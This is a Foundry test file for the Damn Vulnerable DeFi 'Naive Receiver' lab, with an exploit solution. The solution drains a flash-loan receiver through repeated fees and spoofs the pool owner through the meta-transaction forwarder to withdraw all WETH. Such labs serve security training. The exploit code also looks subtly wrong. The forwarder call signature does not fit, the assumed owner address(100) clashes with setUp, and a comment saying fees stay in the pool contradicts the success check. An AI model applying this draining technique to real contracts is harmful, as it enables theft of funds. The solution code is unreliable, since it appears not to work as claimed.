// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
    * Solution Summary:
    * 
    * The Naive Receiver challenge involves draining all funds from a FlashLoanReceiver contract 
    * that holds 10 ETH (WETH). The vulnerability lies in the lending pool (NaiveReceiverPool), 
    * which allows *anyone* to trigger a flash loan on behalf of the receiver. Each flash loan 
    * incurs a fixed fee of 1 WETH, regardless of the loan amount (even 0). Since the receiver 
    * pays the fee, an attacker can force it to pay repeatedly until its balance is depleted.
    * 
    * The solution works as follows:
    * 
    * 1. We prepare a series of 10 flash loan calls via `pool.flashLoan`, each targeting the 
    *    receiver with a 0 WETH loan. Despite borrowing nothing, each call charges a 1 WETH fee, 
    *    draining the receiver's 10 WETH balance completely.
    * 
    * 2. We bundle these 10 flash loans, plus a final `pool.withdraw(1000 ether, recovery)` call, 
    *    into a single `multicall`. This allows us to drain the receiver *and* withdraw the pool's 
    *    entire WETH balance in one transaction.
    * 
    * 3. However, `withdraw` is protected by `_msgSender()`, which uses meta-transaction logic 
    *    (EIP-2771) to extract the original sender from the calldata when called through a trusted 
    *    forwarder. Direct calls from an attacker contract fail authorization.
    * 
    * 4. To bypass this, we route the entire `multicall` through the `BasicForwarder` using 
    *    `forwarder.execute(...)`, passing the owner's address (address(100)) as the "from" context. 
    *    This appends the owner's address to the end of `msg.data`, allowing `_msgSender()` to 
    *    correctly return the owner, thus authorizing the `withdraw`.
    * 
    * 5. We use Foundry's `vm.startPrank(address(forwarder))` to simulate the forwarder calling 
    *    `execute`, making the entire operation appear legitimate.
    * 
    * Why it works:
    * - The receiver has no access control, so anyone can trigger its flash loan repayment.
    * - `multicall` enables atomic execution of multiple actions.
    * - The forwarder allows us to spoof the message sender, bypassing owner checks.
    * 
    * This single transaction drains the receiver and extracts all funds from the pool, solving 
    * the challenge within the "2 transactions max" constraint.
    */   
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Prepare the multicall: 10 flash loans + 1 withdraw
        bytes[] memory calls = new bytes[](11);

        // 10 flash loans (0 amount, but 1 WETH fee each)
        for (uint i = 0; i < 10; i++) {
           calls[i] = abi.encodeCall(
               pool.flashLoan,
               (address(receiver), address(pool.weth()), 0, "")
           );
        }

        // Withdraw all WETH from the pool to recovery address
        calls[10] = abi.encodeCall(
            pool.withdraw,
            (1000 ether, payable(recovery))
        );

        // Owner is the original deployer of the pool
        address owner = address(100); // Standard in this challenge

        // Use the forwarder to call multicall, so _msgSender() returns owner
        // We impersonate the forwarder to call execute()
        vm.startPrank(address(forwarder));

        // forwarder.execute(target, data, forwarderSender)
        forwarder.execute{value: 0}(
            address(pool),
            abi.encodeCall(pool.multicall, (calls)),
            owner // This gets appended to msg.data, making _msgSender() = owner
        );

        vm.stopPrank();

        // ✅ FlashLoanReceiver balance should now be 0
        // ✅ recovery should receive 1000 WETH from pool (fees stay in pool)
        // Challenge solved!
    }   

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
